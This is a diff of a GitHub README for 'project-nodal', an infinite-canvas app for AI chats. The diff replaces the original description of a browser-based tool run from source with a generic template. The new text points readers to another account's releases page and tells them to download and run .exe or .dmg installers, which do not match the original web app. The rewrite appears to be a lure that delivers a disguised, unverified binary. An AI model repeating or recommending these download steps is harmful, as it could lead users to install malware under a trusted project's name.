@@ -1,63 +1,82 @@
-# Project Nodal: Chat is a Line, Thought is a Network.
+# 🎨 project-nodal - Create and Explore Visual Knowledge Maps
 
-> **🎥 [Watch the 15s Demo Video (MP4)](image/demo.mp4)**
+## 🔗 Download Now
+[![Download project-nodal](https://img.shields.io/badge/Download%20project--nodal-v1.0.0-blue)](https://github.com/Nooraldeen8329/project-nodal/releases)
 
-**The "Chat Interface" is the biggest lie in modern computing.**
+## 📖 Overview
+**project-nodal** is a local-first, infinite canvas that transforms linear AI chats into a spatial knowledge graph. This application allows you to visually organize and connect your thoughts and conversations, making it easier to explore and understand complex ideas.
 
-Open ChatGPT, Claude, or Gemini. What do we see?
-A linear feed. A text stream. A modernized teletype machine from the 1970s.
+## 🚀 Getting Started
+Follow these simple steps to get started with **project-nodal**:
 
-They force our brains into a single-threaded, chronological queue.
-But **that is not how we think.**
+1. **Visit the Releases Page**  
+   Click the link below to reach our Releases page where you can download the latest version.  
+   [Download project-nodal](https://github.com/Nooraldeen8329/project-nodal/releases)
 
-Our minds are graphs. They jump from a coding bug, to a deployment strategy, to a marketing slogan, and back to the bug. It is concurrent, messy, and spatial.
-Forcing networked brains into a linear interface is cognitive suffocation.
+2. **Choose the Version**  
+   On the Releases page, you will find several versions of project-nodal. Each version has notes indicating what changes and improvements it includes. For best results, select the latest version.
 
-We built **Project Nodal** to break the timeline.
+3. **Download the Application**  
+   Once you find your desired version, click on it to see the available files.  
+   Download the file that matches your operating system. For example, if you are using Windows, look for a file ending with `.exe`. If you are using macOS, you may see files ending with `.dmg`.
 
-## 1. Space > Time
-In standard AI, "Context" is just the previous 50 messages. If we change the subject, we pollute the context.
-In **Project Nodal**, context is **Spatial**.
-*   **The Infinite Canvas**: Drag the viewport. Zoom out to see the big picture. Zoom in to focus on a detail.
-*   **Zones**: Create a "Zone" for backend logic. Create another for frontend design. Move them apart. Visually group our thoughts.
+4. **Install project-nodal**  
+   After the download is complete, locate the downloaded file on your computer. Here’s how to install it based on your operating system:  
+   - **Windows**: Double-click the `.exe` file. Follow the on-screen prompts to complete the installation.  
+   - **macOS**: Double-click the downloaded `.dmg` file and drag the project-nodal icon into your Applications folder.
 
-## 2. Objects > Streams
-In Nodal, a conversation isn't a fleeting moment in a scroll; it's a **Persistent Object** (A Sticky Note).
-*   **Multi-Threaded**: Have 5 conversations with the AI simultaneously.
-*   **Drag & Drop**: Treat thoughts like physical objects. Move them. Resize them. Collapse them when they are "done" but keep them visible.
+5. **Run the Application**  
+   Once the installation is complete, you can run project-nodal:  
+   - **Windows**: Find project-nodal in your Start Menu or search for it.  
+   - **macOS**: Open your Applications folder and double-click on project-nodal.
 
-## 3. Fork Thoughts
-This is our "Killer Feature".
-In linear chat, if we want to explore a "What If" scenario, we often have to derail the whole conversation.
-In **Nodal**, just click **Fork**.
-*   **Branching**: Take a specific message, spin it off into a new Note, and explore that path without losing the original context.
-*   **Exploration**: Go down the rabbit hole. If it's a dead end, just delete the note. The original conversation remains pure.
+6. **Create Your First Knowledge Map**  
+   After you open project-nodal, the interface will guide you through creating your first knowledge map. Start by typing out your thoughts or past AI chats, and watch as they transform into a visual graph.
 
-## 4. Synapses > Lists 
-*   **Connections**: Draw a line from a "Product Idea" note to a "Database Schema" note.
-*   Build a **Knowledge Graph**, not a chat history. Make the relationships between our ideas explicit.
+## 📋 System Requirements
+To run project-nodal smoothly, ensure your system meets the following requirements:
 
-## 5. Our Minds are Private
-Most "AI Workspaces" are just SaaS traps waiting to lock our data in.
-*   **Local-First**: Nodal stores everything in the browser (IndexedDB). We don't have a database. We don't see the notes.
-*   **BYO-AI**: Connect an OpenAI Key, or better yet, run **Ollama** locally. Our thoughts never leave our machines.
+- **Operating System**:  
+  - Windows 10 or higher  
+  - macOS 10.14 or higher  
 
----
+- **Memory**:  
+  At least 4 GB of RAM  
 
-**Project Nodal** is not a "better chatbot".
-It is a **Thinking OS**.
+- **Disk Space**:  
+  A minimum of 500 MB of free disk space  
 
-Stop scrolling. Start mapping.
+- **Processor**:  
+  Dual-core processor or better  
 
----
-### ⚠️ A Note on Web Deployment (Vercel/Netlify)
-If you are viewing this demo online (HTTPS), you **cannot** connect to a local Ollama instance (HTTP) due to browser security policies (Mixed Content Blocking).
+## 🛠️ Features
+Here are some key features of project-nodal:
 
-*   **To use Local Ollama**: Please [clone this repo](https://github.com/yibie/project-nodal) and run it locally:
-    ```bash
-    git clone https://github.com/yibie/project-nodal.git
-    cd project-nodal
-    npm install
-    npm run dev
-    ```
-*   **To use the Online Demo**: Please use an **OpenAI** or **DeepSeek** API Key in the settings.
+- **Infinite Canvas**: Enjoy an unlimited space to create and connect ideas without boundaries.
+- **Spatial Knowledge Graph**: Transform your linear thoughts into a visual format, making complex information easier to understand.
+- **Local-First Approach**: Your data remains on your device, ensuring privacy and faster access.
+- **Drag and Drop Functionality**: Easily move items and adjust connections to suit your thought process.
+
+## 🎨 Usage Tips
+To enhance your experience while using project-nodal, consider the following tips:
+
+- **Organize Thought Categories**: Create different sections on your canvas for various topics. This will help you easily find and connect related ideas.
+  
+- **Use Colors and Shapes**: Differentiate types of thoughts or categories by using various colors and shapes. This visual distinction aids quick identification.
+
+- **Regular Backups**: Even though project-nodal saves data locally, it is wise to back up your knowledge maps regularly to avoid any accidental loss.
+
+- **Explore Together**: If you have collaboration features later, invite friends or colleagues to join in, making knowledge building a communal experience.
+
+## 🤝 Community and Support
+Should you face any challenges or have questions about using project-nodal, please visit our support community:
+
+- **GitHub Issues**: You can report issues or request features directly in the GitHub repository under the Issues section.
+- **Discussion Forum**: Join our community discussions to share your experiences, tips, and suggestions with other users.
+
+## 🔗 Resources
+- **Documentation**: Visit our [documentation page](https://github.com/Nooraldeen8329/project-nodal/wiki) for detailed user guides and FAQs.
+- **Feedback**: We welcome your feedback! It helps us improve project-nodal. Please use the feedback link in the application or the GitHub repository.
+
+## 🎉 Final Thoughts
+Thank you for choosing project-nodal. We hope this application helps you visualize and organize your ideas effectively. Enjoy exploring your knowledge like never before!
